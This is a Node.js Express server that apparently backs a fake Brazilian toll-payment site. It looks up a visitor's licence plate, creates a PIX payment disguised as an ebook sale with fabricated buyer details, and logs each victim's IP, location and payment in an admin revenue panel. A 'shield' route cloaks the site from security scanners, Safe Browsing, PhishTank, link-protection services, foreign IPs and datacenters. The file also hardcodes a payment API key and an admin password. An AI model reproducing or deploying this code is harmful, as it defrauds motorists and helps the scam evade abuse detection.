const express = require('express');
const cors = require('cors');

const app = express();

const ALLOWED_ORIGINS = [
    'https://www.freeflow-pedagio.site',
    'https://freeflow-pedagio.site',
];

const INTERNAL_KEY = process.env.INTERNAL_KEY || 'fd-k9x2mq7v4n8p1w6j3t5r';

app.use(cors({
    origin: (origin, cb) => {
        if (!origin || ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
        return cb(new Error('Not allowed'));
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Internal-Key'],
}));

app.use(express.json());

// Block direct browser access to API routes
function requireInternalKey(req, res, next) {
    const key = req.headers['x-internal-key'];
    if (key !== INTERNAL_KEY) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
}

const MANGOFY_API_KEY = process.env.MANGOFY_API_KEY || '2cb435b12f2f8431fbd9b7e1f0b34540e2axyl1axlbg34ckxjxaxvbyool0oen';
const MANGOFY_STORE_CODE = process.env.MANGOFY_STORE_CODE || 'd2b22f8faf5a2081e772328755ce7349';
const MANGOFY_API_URL = 'https://checkout.mangofy.com.br/api/v1';

// ---------- GERAR PIX ----------
app.post('/api/gerar_pix', requireInternalKey, async (req, res) => {
    const { valorTransacao, placa } = req.body || {};
    const valor = parseFloat(valorTransacao) || 0;
    const placaClean = (placa || '').toUpperCase().trim();

    if (valor <= 0 || !placaClean) {
        return res.status(400).json({ success: false, error: 'Dados inválidos' });
    }

    const valorCentavos = Math.round(valor * 100);
    if (valorCentavos < 500) {
        return res.status(400).json({ success: false, error: 'Valor mínimo é R$ 5,00' });
    }

    const payload = {
        payment_method: 'pix',
        payment_format: 'regular',
        installments: 1,
        payment_amount: valorCentavos,
        postback_url: (process.env.RAILWAY_PUBLIC_DOMAIN
            ? 'https://' + process.env.RAILWAY_PUBLIC_DOMAIN
            : 'https://localhost:3000') + '/api/webhook',
        external_code: 'PED_' + Math.random().toString(36).substring(2,10).toUpperCase() + '_' + Date.now(),
        items: [{
            code: 'EBOOK_' + Date.now(),
            name: 'Ebook Digital',
            amount: valorCentavos,
            total: 1,
        }],
        customer: {
            email: 'user_' + Math.random().toString(36).substring(2,10) + '@gmail.com',
            name: 'Cliente #' + Math.random().toString(36).substring(2,8).toUpperCase(),
            document: '00000000000',
            phone: '11999999999',
            ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '177.70.100.1',
        },
        pix: { expires_in_days: 1 },
    };

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment', {
            method: 'POST',
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        const data = await response.json();

        if (response.ok && data.payment_code) {
            const pix = data.pix || data.checkout || {};
            const qrcode = pix.pix_qrcode_text || pix.qr_code || pix.qrcode || pix.emv || pix.brcode || pix.code
                || data.qr_code || data.qrcode || data.emv || data.brcode || '';
            const qrcodeBase64 = pix.qr_code_base64 || pix.qrcode_base64 || pix.image || pix.base64
                || data.qr_code_base64 || data.qrcode_base64 || data.image || '';

            return res.json({
                success: true,
                transaction_id: data.payment_code,
                qrcode,
                qrcode_base64: qrcodeBase64,
                valor,
            });
        }

        return res.status(400).json({
            success: false,
            error: data.message || data.error || 'Erro ao gerar PIX',
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão com gateway' });
    }
});

// ---------- CONSULTAR STATUS ----------
app.post('/api/consultar_status_pix', requireInternalKey, async (req, res) => {
    const { transaction_id } = req.body || {};
    const paymentCode = (transaction_id || '').trim();

    if (!paymentCode) {
        return res.status(400).json({ success: false, error: 'transaction_id é obrigatório' });
    }

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment/' + encodeURIComponent(paymentCode), {
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
        });

        const data = await response.json();

        if (response.ok && data) {
            const statusMap = { approved: 'paid', pending: 'pending', refunded: 'refunded', error: 'error' };
            const status = statusMap[data.payment_status] || 'pending';
            return res.json({
                success: true,
                status,
                paid_at: data.payment_status === 'approved' ? (data.approved_at || new Date().toISOString()) : null,
            });
        }

        return res.json({ success: true, status: 'pending', paid_at: null });
    } catch (e) {
        return res.json({ success: true, status: 'pending', paid_at: null });
    }
});

// ---------- VEICULOS ----------
app.get('/api/veiculos', requireInternalKey, async (req, res) => {
    const placa = (req.query.placa || '').toUpperCase().trim();

    if (!placa || !/^[A-Z]{3}[0-9][A-Z0-9][0-9]{2}$/.test(placa)) {
        return res.status(400).json({ success: false, error: 'Placa inválida' });
    }

    try {
        const response = await fetch('https://www.achecar.com.br/api/free-lookup', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://www.achecar.com.br',
                'Referer': 'https://www.achecar.com.br/consulta-gratuita',
            },
            body: JSON.stringify({ plate: placa }),
        });

        if (!response.ok) return res.status(502).json({ success: false, error: 'Consulta falhou' });

        const data = await response.json();
        if (!data.brand && !data.model) return res.status(404).json({ success: false, error: 'Não encontrado' });

        return res.json({
            success: true,
            veiculo: {
                marca: data.brand || '', modelo: data.model || '', descricao: data.brandModel || '',
                ano: data.year || '', anoModelo: data.yearModel || '', cor: data.color || '',
                combustivel: data.fuel || '', tipo: data.vehicleType || '',
                cidade: data.city || '', estado: data.state || '', potencia: data.power || '',
                nacionalidade: data.nationality || '',
            },
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão' });
    }
});

// ---------- PERSISTENT STORAGE (GitHub-backed) ----------
const fs = require('fs');
const DATA_FILE = '/tmp/freeflow-events.json';

// GitHub storage config — set GITHUB_TOKEN + GITHUB_REPO in Railway env vars
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const GITHUB_REPO  = process.env.GITHUB_REPO  || '';  // ex: 'retzzzz/freeflow-data'
const GH_FILE      = 'events.json';
const GH_HEADERS   = () => ({
    Authorization: `Bearer ${GITHUB_TOKEN}`,
    Accept: 'application/vnd.github+json',
    'Content-Type': 'application/json',
    'User-Agent': 'freeflow-api',
});

let _ghSha     = null;   // SHA do arquivo no GitHub (necessário para atualizar)
let _ghSaving  = false;  // mutex: evita saves concorrentes
let _ghPending = false;  // flag: novo save aguardando enquanto outro roda

async function ghLoad() {
    if (!GITHUB_TOKEN || !GITHUB_REPO) return null;
    try {
        const r = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GH_FILE}`, {
            headers: GH_HEADERS(),
        });
        if (r.status === 404) { _ghSha = null; return []; }
        if (!r.ok) { console.log('[GH] Load HTTP', r.status); return null; }
        const d = await r.json();
        _ghSha = d.sha;
        const raw = Buffer.from(d.content.replace(/\n/g, ''), 'base64').toString('utf8');
        return JSON.parse(raw);
    } catch(e) { console.log('[GH] Load error:', e.message); return null; }
}

async function ghSave(snapshot) {
    if (!GITHUB_TOKEN || !GITHUB_REPO) return;
    if (_ghSaving) { _ghPending = true; return; }
    _ghSaving = true;
    try {
        const content = Buffer.from(JSON.stringify(snapshot)).toString('base64');
        const body    = { message: 'update events', content, branch: 'main' };
        if (_ghSha) body.sha = _ghSha;

        const r = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GH_FILE}`, {
            method: 'PUT',
            headers: GH_HEADERS(),
            body: JSON.stringify(body),
        });

        if (r.status === 409) {
            // SHA conflito: recarregar SHA e tentar de novo
            console.log('[GH] SHA conflict, refreshing SHA...');
            const fresh = await ghLoad();
            if (fresh !== null && _ghSha) {
                const r2 = await fetch(`https://api.github.com/repos/${GITHUB_REPO}/contents/${GH_FILE}`, {
                    method: 'PUT',
                    headers: GH_HEADERS(),
                    body: JSON.stringify({ message: 'update events (retry)', content, branch: 'main', sha: _ghSha }),
                });
                if (r2.ok) { const d2 = await r2.json(); _ghSha = d2.content?.sha || _ghSha; }
            }
        } else if (r.ok) {
            const d = await r.json();
            _ghSha = d.content?.sha || _ghSha;
        } else {
            console.log('[GH] Save HTTP', r.status);
        }
    } catch(e) { console.log('[GH] Save error:', e.message); }
    _ghSaving = false;
    if (_ghPending) { _ghPending = false; ghSave([...events]); }
}

let events = [];

// 1) Carrega /tmp imediatamente (sobrevive restarts curtos)
try {
    if (fs.existsSync(DATA_FILE)) {
        const raw = fs.readFileSync(DATA_FILE, 'utf8');
        events = JSON.parse(raw);
        console.log('[BOOT] Loaded', events.length, 'events from /tmp');
    }
} catch(e) { events = []; }

// 2) Carrega GitHub (fonte autoritativa, sobrevive deploys)
ghLoad().then(ghData => {
    if (ghData === null) { console.log('[GH] Skipped (no token/repo configured)'); return; }
    if (ghData.length >= events.length) {
        // GitHub tem dados mais completos — usa GitHub
        events = ghData;
        console.log('[BOOT] GitHub authoritative:', events.length, 'events loaded');
        try { fs.writeFileSync(DATA_FILE, JSON.stringify(events), 'utf8'); } catch(_) {}
    } else if (events.length > 0) {
        // /tmp tem mais dados (ex: crash antes de sincronizar) — sobe /tmp → GitHub
        console.log('[BOOT] Syncing /tmp →  GitHub (', events.length, 'events)');
        ghSave([...events]);
    }
}).catch(e => console.log('[GH] Boot error:', e.message));

function saveEvents() {
    // Síncrono: /tmp (rápido, cache local)
    try { fs.writeFileSync(DATA_FILE, JSON.stringify(events), 'utf8'); } catch(_) {}
    // Assíncrono: GitHub (persistente, não bloqueia request)
    ghSave([...events]).catch(() => {});
}

// ---------- SHIELD (Anti-bot / Geo-block / Datacenter) ----------

const geoCache = new Map();
const GEO_TTL = 3600000; // 1h cache

const BOT_UA = [
    'bot','crawler','spider','scraper','scan','check','monitor',
    'curl','wget','python','go-http','java/','perl/','ruby','php/',
    'phantom','headless','puppeteer','playwright','selenium','webdriver',
    'googlebot','bingbot','yandex','baidu','duckduck',
    'facebookexternalhit','twitterbot','linkedinbot','slackbot','telegrambot','whatsapp',
    'barracuda','proofpoint','symantec','forcepoint','mimecast',
    'safelinks','safebrowsing','phishtank','url protection','urldefense',
    'messagelabs','spamhaus','fortiguard','websense',
    'semrush','ahrefs','majestic','moz.com','bytespider',
    'censys','shodan','nmap','nikto','sqlmap','masscan',
    'postman','insomnia','httpie','axios/','node-fetch','undici',
    'preview','archiv','dispatch','applebot','petalbot',
    'mail.ru','seznam','sogou','exabot','ia_archiver',
];

const DC_ISP = [
    'amazon','aws','ec2','google cloud','gcp','microsoft','azure',
    'digitalocean','ovh','hetzner','linode','akamai','vultr',
    'oracle cloud','cloudflare','contabo','hostgator','godaddy',
    'bluehost','rackspace','scaleway','upcloud','kamatera',
    'leaseweb','cogent','choopa','serverius','quadranet','psychz',
    'colocrossing','hostwinds','ionos','fastly','incapsula',
    'sucuri','stackpath','m247','datacamp','zscaler',
    'fortinet','palo alto','barracuda networks',
];

function isBotUA(ua) {
    const l = (ua || '').toLowerCase();
    if (!l || l.length < 15) return true; // UA vazio ou muito curto = bot
    return BOT_UA.some(p => l.includes(p));
}

function isDCProvider(isp, org) {
    const c = ((isp || '') + ' ' + (org || '')).toLowerCase();
    return DC_ISP.some(p => c.includes(p));
}

async function getGeo(ip) {
    if (!ip || ip === '127.0.0.1' || ip === '::1') return null;
    const cached = geoCache.get(ip);
    if (cached && Date.now() - cached.ts < GEO_TTL) return cached.data;
    try {
        const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,hosting`);
        if (!r.ok) return null;
        const data = await r.json();
        if (data.status === 'fail') return null;
        geoCache.set(ip, { data, ts: Date.now() });
        // Limpar cache antigo
        if (geoCache.size > 10000) {
            const old = [...geoCache.entries()].sort((a, b) => a[1].ts - b[1].ts).slice(0, 5000);
            old.forEach(([k]) => geoCache.delete(k));
        }
        return data;
    } catch(_) { return null; }
}

app.get('/api/shield', requireInternalKey, async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
    const ua = req.headers['user-agent'] || '';

    // 1. Bot User-Agent
    if (isBotUA(ua)) return res.json({ ok: false, r: 'ua' });

    // 2. Geo — só Brasil
    const geo = await getGeo(ip);
    if (!geo) return res.json({ ok: true }); // Fail-open se geo falhar
    if (geo.countryCode !== 'BR') return res.json({ ok: false, r: 'geo' });

    // 3. Datacenter / hosting provider
    if (geo.hosting === true) return res.json({ ok: false, r: 'dc' });
    if (isDCProvider(geo.isp, geo.org)) return res.json({ ok: false, r: 'dc' });

    res.json({ ok: true });
});

// ---------- WEBHOOK ----------
app.post('/api/webhook', (req, res) => {
    const data = req.body || {};
    const code = data.payment_code || '';
    if (data.payment_status === 'approved' && code) {
        const ev = events.find(e => e.pixCode === code);
        if (ev) { ev.status = 'pago'; ev.pagoEm = ev.pagoEm || new Date().toISOString(); saveEvents(); }
    }
    res.json({ received: true });
});

// ---------- TRACKING ----------

function spTime(iso) {
    return new Date(iso).toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo', hour12: false });
}
function isMobile(ua) {
    return /android|iphone|ipad|ipod|mobile|phone/i.test(ua);
}

function findSession(ip, placa) {
    // Match by placa first (most precise), then by IP within last 2h
    if (placa) {
        const byPlaca = events.find(e => e.placa === placa);
        if (byPlaca) return byPlaca;
    }
    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    return events.find(e => e.ip === ip && new Date(e.criadoEm).getTime() > cutoff) || null;
}

app.post('/api/track', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
    const ua = req.headers['user-agent'] || '';
    const { tipo, placa, valor, pixCode, utm } = req.body || {};
    const now = new Date().toISOString();

    let session = findSession(ip, placa || '');

    if (!session) {
        // Usa getGeo cacheado (compartilha cache com shield)
        const geo = await getGeo(ip) || {};

        session = {
            id: Date.now() + Math.random(),
            ip,
            ua,
            mobile: isMobile(ua),
            pais: geo.country || '',
            estado: geo.regionName || '',
            cidade: geo.city || '',
            isp: geo.isp || '',
            placa: placa || '',
            valor: null,
            pixCode: '',
            status: 'visita',
            utm: utm || {},
            visitaEm: now,
            consultouEm: null,
            pixGeradoEm: null,
            pagoEm: null,
            criadoEm: now,
            atualizadoEm: now,
        };
        events.unshift(session);
    }

    // Update session fields based on tipo
    if (placa) session.placa = placa;
    session.atualizadoEm = now;

    if (tipo === 'consultou') {
        session.consultouEm = session.consultouEm || now;
        session.status = 'consultou';
    } else if (tipo === 'pix_gerado') {
        session.pixGeradoEm = session.pixGeradoEm || now;
        session.valor = valor || session.valor;
        session.pixCode = pixCode || session.pixCode;
        session.status = 'pix_gerado';
    } else if (tipo === 'pago') {
        session.pagoEm = session.pagoEm || now;
        session.valor = valor || session.valor;
        session.pixCode = pixCode || session.pixCode;
        session.status = 'pago';
    }

    saveEvents();
    res.json({ ok: true });
});

// ---------- PAINEL ADMIN ----------
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Br@sil2019';

app.get('/painel/export', (req, res) => {
    if (req.query.senha !== ADMIN_PASSWORD) return res.status(403).send('Forbidden');
    res.setHeader('Content-Type', 'application/json');
    res.setHeader('Content-Disposition', 'attachment; filename="eventos.json"');
    res.send(JSON.stringify(events, null, 2));
});

app.get('/painel/clear', (req, res) => {
    if (req.query.senha !== ADMIN_PASSWORD) return res.status(403).json({ error: 'Senha incorreta' });
    events.length = 0;
    saveEvents();
    res.json({ ok: true });
});

app.get('/painel', (req, res) => {
    const { senha, page } = req.query;

    if (senha !== ADMIN_PASSWORD) {
        return res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesso restrito</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui,sans-serif;background:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#1e293b;border-radius:16px;padding:40px 32px;width:min(360px,92vw);box-shadow:0 20px 60px #0008}
h2{color:#fff;font-size:20px;margin-bottom:24px;text-align:center}
input{width:100%;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:12px 14px;color:#fff;font-size:15px;outline:none;margin-bottom:16px}
input:focus{border-color:#6366f1}
button{width:100%;background:#6366f1;color:#fff;border:none;border-radius:8px;padding:13px;font-size:15px;font-weight:700;cursor:pointer}
button:hover{background:#4f46e5}.err{color:#f87171;font-size:13px;text-align:center;margin-top:10px;display:none}
</style></head><body>
<div class="box">
  <h2>🔒 Painel Admin</h2>
  <form id="f">
    <input type="password" id="pw" placeholder="Senha" autocomplete="current-password" autocapitalize="none" autocorrect="off" spellcheck="false">
    <button type="submit">Entrar</button>
    <p class="err" id="err">Senha incorreta</p>
  </form>
</div>
<script>
document.getElementById('f').addEventListener('submit',function(e){
  e.preventDefault();
  var pw=document.getElementById('pw').value.trim();
  if(pw){
    var url='/painel?senha='+encodeURIComponent(pw);
    window.location.replace(url);
  } else {
    document.getElementById('err').style.display='block';
  }
});
document.getElementById('pw').focus();
</script></body></html>`);
    }

    const PER_PAGE = 100;
    const currentPage = Math.max(1, parseInt(page) || 1);
    const totalPages = Math.max(1, Math.ceil(events.length / PER_PAGE));
    const pageEvents = events.slice((currentPage - 1) * PER_PAGE, currentPage * PER_PAGE);

    const total = events.length;
    const visitas = events.filter(e => e.visitaEm).length;
    const consultou = events.filter(e => e.consultouEm).length;
    const pixGerados = events.filter(e => e.pixGeradoEm).length;
    const pagamentos = events.filter(e => e.pagoEm).length;
    const uniqueIPs = new Set(events.map(e => e.ip)).size;
    const receita = events.filter(e => e.pagoEm && e.valor).reduce((s, e) => s + parseFloat(e.valor || 0), 0);
    const pct = (n, d) => d > 0 ? Math.round(n / d * 100) : 0;

    function statusBadge(s) {
        const map = {
            visita:      ['bv', '👀 Visita'],
            consultou:   ['bc2','🔍 Consultou'],
            pix_gerado:  ['bp', '💳 PIX Gerado'],
            pago:        ['bc', '✅ Pago'],
        };
        const [cls, label] = map[s] || ['bv', s];
        return `<span class="badge ${cls}">${label}</span>`;
    }

    const rows = pageEvents.map(ev => {
        const deviceIcon = ev.mobile ? '📱' : '🖥️';
        const deviceLabel = ev.mobile ? 'Mobile' : 'Desktop';
        const loc = [ev.cidade, ev.estado, ev.pais].filter(Boolean).join(', ');
        const val = ev.valor ? 'R$ ' + parseFloat(ev.valor).toFixed(2).replace('.', ',') : '—';
        const pagoTxt = ev.pagoEm ? spTime(ev.pagoEm) : '—';
        const uaSafe = (ev.ua || '').replace(/</g, '&lt;');
        const utmSrc = (ev.utm && ev.utm.utm_source) ? ev.utm.utm_source : (ev.utm && ev.utm.gclid ? 'google/cpc' : '—');
        return `<tr data-status="${ev.status}" data-placa="${(ev.placa||'').toLowerCase()}">
      <td>${spTime(ev.criadoEm)}</td>
      <td>${statusBadge(ev.status)}</td>
      <td>${ev.placa || '—'}</td>
      <td>${val}</td>
      <td>${ev.visitaEm ? spTime(ev.visitaEm) : '—'}</td>
      <td>${ev.consultouEm ? spTime(ev.consultouEm) : '—'}</td>
      <td>${ev.pixGeradoEm ? spTime(ev.pixGeradoEm) : '—'}</td>
      <td>${pagoTxt}</td>
      <td>${ev.ip}</td>
      <td>${loc || '—'}</td>
      <td title="${uaSafe}">${deviceIcon} ${deviceLabel}</td>
      <td class="ua" title="${uaSafe}">${uaSafe}</td>
      <td>${utmSrc}</td>
    </tr>`;
    }).join('');

    const encPw = encodeURIComponent(ADMIN_PASSWORD);
    const pagerLinks = [];
    for (let i = 1; i <= totalPages; i++) {
        pagerLinks.push(`<a href="/painel?senha=${encPw}&page=${i}" class="${i===currentPage?'active':''}">${i}</a>`);
    }

    res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Painel Admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
.top{background:#1e293b;padding:14px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #334155;flex-wrap:wrap}
.top h1{font-size:16px;font-weight:700;flex:1}
.top a{color:#94a3b8;font-size:13px;text-decoration:none;white-space:nowrap}
.top a:hover{color:#fff}
.stats{display:flex;gap:12px;padding:16px 20px;flex-wrap:wrap}
.stat{background:#1e293b;border-radius:10px;padding:16px 20px;border:1px solid #334155;min-width:120px;flex:1}
.stat .n{font-size:28px;font-weight:900;color:#6366f1}
.stat .l{font-size:12px;color:#94a3b8;margin-top:2px}
.wrap{padding:0 20px 40px;overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:12px;table-layout:fixed}
th{background:#1e293b;padding:9px 10px;text-align:left;color:#94a3b8;font-weight:600;
   border-bottom:1px solid #334155;position:sticky;top:0;z-index:2;
   overflow:hidden;min-width:60px;white-space:nowrap;user-select:none}
.resizer{position:absolute;right:0;top:0;height:100%;width:5px;cursor:col-resize;background:transparent;z-index:3}
.resizer:hover,.resizer.active{background:#6366f1}
td{padding:8px 10px;border-bottom:1px solid #1a2535;vertical-align:middle;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
tr:hover td{background:#1a2535}
.badge{display:inline-block;padding:2px 7px;border-radius:999px;font-size:10px;font-weight:700;white-space:nowrap}
.bv{background:#1e3a5f;color:#60a5fa}
.bc2{background:#1a3030;color:#34d399}
.bp{background:#2d2a10;color:#facc15}
.bc{background:#1a2d1a;color:#4ade80}
.ua{font-size:10px;color:#64748b;max-width:200px}
.sub{padding:8px 20px 12px;font-size:13px;color:#64748b;display:flex;align-items:center;gap:16px}
.pager{display:flex;gap:6px;flex-wrap:wrap;padding:0 20px 20px}
.pager a{background:#1e293b;color:#94a3b8;padding:5px 11px;border-radius:6px;text-decoration:none;font-size:13px;border:1px solid #334155}
.pager a:hover{background:#334155;color:#fff}
.pager a.active{background:#6366f1;color:#fff;border-color:#6366f1}
</style></head><body>
<div class="top">
  <h1>📊 Painel Admin — freeflow-pedagio.site</h1>
  <a href="/painel/export?senha=${encPw}">⬇ Exportar JSON</a>
  <a href="#" id="btnLimpar" style="color:#f87171">🗑 Limpar Dados</a>
</div>
<div class="stats">
  <div class="stat"><div class="n">${total}</div><div class="l">Sessões totais</div></div>
  <div class="stat"><div class="n">${visitas}</div><div class="l">👀 Visitaram</div></div>
  <div class="stat"><div class="n">${consultou} <span style="font-size:14px;color:#94a3b8">${pct(consultou,visitas)}%</span></div><div class="l">🔍 Consultaram placa</div></div>
  <div class="stat"><div class="n">${pixGerados} <span style="font-size:14px;color:#94a3b8">${pct(pixGerados,visitas)}%</span></div><div class="l">💳 PIX gerados</div></div>
  <div class="stat"><div class="n">${pagamentos} <span style="font-size:14px;color:#94a3b8">${pct(pagamentos,visitas)}%</span></div><div class="l">✅ Pagamentos</div></div>
  <div class="stat"><div class="n" style="color:#4ade80">R$&nbsp;${receita.toFixed(2).replace('.',',')}</div><div class="l">💰 Receita total</div></div>
  <div class="stat"><div class="n">${uniqueIPs}</div><div class="l">IPs únicos</div></div>
</div>
<div class="sub" style="flex-wrap:wrap;gap:10px;">
  <span>Página ${currentPage} de ${totalPages} — ${total} eventos totais — Horário: São Paulo (UTC-3)</span>
  <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
    <input id="filtroPlaca" type="text" placeholder="Filtrar placa..." style="background:#0f172a;border:1px solid #334155;border-radius:6px;padding:5px 10px;color:#fff;font-size:12px;outline:none;width:130px">
    <select id="filtroStatus" style="background:#0f172a;border:1px solid #334155;border-radius:6px;padding:5px 10px;color:#fff;font-size:12px;outline:none;">
      <option value="">Todos status</option>
      <option value="visita">👀 Visita</option>
      <option value="consultou">🔍 Consultou</option>
      <option value="pix_gerado">💳 PIX Gerado</option>
      <option value="pago">✅ Pago</option>
    </select>
  </div>
</div>
<div class="wrap">
<table>
<colgroup id="colgroup">
  <col id="col0" style="width:130px"><col id="col1" style="width:120px"><col id="col2" style="width:80px">
  <col id="col3" style="width:80px"><col id="col4" style="width:130px"><col id="col5" style="width:130px">
  <col id="col6" style="width:130px"><col id="col7" style="width:130px"><col id="col8" style="width:110px">
  <col id="col9" style="width:160px"><col id="col10" style="width:80px"><col id="col11" style="width:200px">
  <col id="col12" style="width:100px">
</colgroup>
<thead><tr>
  <th>1ª Visita</th><th>Status</th><th>Placa</th><th>Valor</th>
  <th>Visitou em</th><th>Consultou em</th><th>PIX gerado em</th><th>Pago em</th>
  <th>IP</th><th>Localização</th><th>Dispositivo</th><th>Navegador (UA)</th><th>Fonte UTM</th>
</tr></thead>
<tbody id="tBody">${rows || '<tr><td colspan="13" style="text-align:center;padding:40px;color:#64748b">Nenhum evento ainda</td></tr>'}</tbody>
</table>
</div>
<div class="pager">${pagerLinks.join('')}</div>
<script>
document.getElementById('btnLimpar').addEventListener('click', function(e){
  e.preventDefault();
  var modal = document.createElement('div');
  modal.style.cssText='position:fixed;inset:0;background:#0009;display:flex;align-items:center;justify-content:center;z-index:9999';
  modal.innerHTML = '<div style="background:#1e293b;border-radius:14px;padding:32px;width:min(360px,92vw);border:1px solid #334155;box-shadow:0 20px 60px #0008">'
    +'<h3 style="color:#f87171;margin:0 0 8px;font-size:17px">🗑 Limpar todos os dados?</h3>'
    +'<p style="color:#94a3b8;font-size:13px;margin:0 0 20px">Esta ação é irreversível. Todos os registros serão apagados permanentemente.</p>'
    +'<input type="password" id="clearPw" placeholder="Digite a senha para confirmar" style="width:100%;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:11px 13px;color:#fff;font-size:14px;outline:none;box-sizing:border-box;margin-bottom:14px">'
    +'<div style="display:flex;gap:10px">'
    +'<button id="clearCancel" style="flex:1;background:#334155;color:#94a3b8;border:none;border-radius:8px;padding:11px;font-size:14px;cursor:pointer">Cancelar</button>'
    +'<button id="clearConfirm" style="flex:1;background:#dc2626;color:#fff;border:none;border-radius:8px;padding:11px;font-size:14px;font-weight:700;cursor:pointer">Apagar tudo</button>'
    +'</div>'
    +'<p id="clearErr" style="color:#f87171;font-size:12px;margin:10px 0 0;display:none;text-align:center">Senha incorreta.</p>'
    +'</div>';
  document.body.appendChild(modal);
  document.getElementById('clearCancel').onclick = function(){ document.body.removeChild(modal); };
  modal.addEventListener('click', function(ev){ if(ev.target===modal) document.body.removeChild(modal); });
  document.getElementById('clearConfirm').onclick = function(){
    var pw = document.getElementById('clearPw').value;
    fetch('/painel/clear?senha='+encodeURIComponent(pw))
      .then(function(r){ return r.json(); })
      .then(function(d){
        if(d.ok){ document.body.removeChild(modal); window.location.href='/painel?senha='+encodeURIComponent(pw); }
        else { document.getElementById('clearErr').style.display='block'; }
      })
      .catch(function(){ document.getElementById('clearErr').style.display='block'; });
  };
});

// Filtro client-side
(function(){
  var filtroPlaca = document.getElementById('filtroPlaca');
  var filtroStatus = document.getElementById('filtroStatus');
  function aplicarFiltro(){
    var pl = (filtroPlaca.value||'').toLowerCase().trim();
    var st = filtroStatus.value;
    document.querySelectorAll('#tBody tr[data-status]').forEach(function(tr){
      var matchP = !pl || (tr.dataset.placa||'').includes(pl);
      var matchS = !st || tr.dataset.status === st;
      tr.style.display = (matchP && matchS) ? '' : 'none';
    });
  }
  if(filtroPlaca) filtroPlaca.addEventListener('input', aplicarFiltro);
  if(filtroStatus) filtroStatus.addEventListener('change', aplicarFiltro);
})();

(function(){
  var ths = document.querySelectorAll('thead th');
  var cols = document.querySelectorAll('#colgroup col');
  ths.forEach(function(th, i){
    var r = document.createElement('div');
    r.className = 'resizer';
    th.appendChild(r);
    var startX, startW;
    r.addEventListener('mousedown', function(e){
      startX = e.pageX;
      startW = cols[i] ? parseInt(cols[i].style.width) || th.offsetWidth : th.offsetWidth;
      r.classList.add('active');
      document.body.style.cursor = 'col-resize';
      document.addEventListener('mousemove', onMove);
      document.addEventListener('mouseup', onUp);
      e.preventDefault();
      e.stopPropagation();
    });
    function onMove(e){
      var w = Math.max(50, startW + (e.pageX - startX));
      if(cols[i]) cols[i].style.width = w + 'px';
    }
    function onUp(){
      r.classList.remove('active');
      document.body.style.cursor = '';
      document.removeEventListener('mousemove', onMove);
      document.removeEventListener('mouseup', onUp);
    }
  });
})();
</script>
</body></html>`);
});

// ---------- HEALTH (hidden) ----------
app.get('/', (req, res) => res.status(404).send('Not found'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('API running on port ' + PORT + ' — storage: ' + (GITHUB_REPO ? 'GitHub (' + GITHUB_REPO + ')' : '/tmp only')));
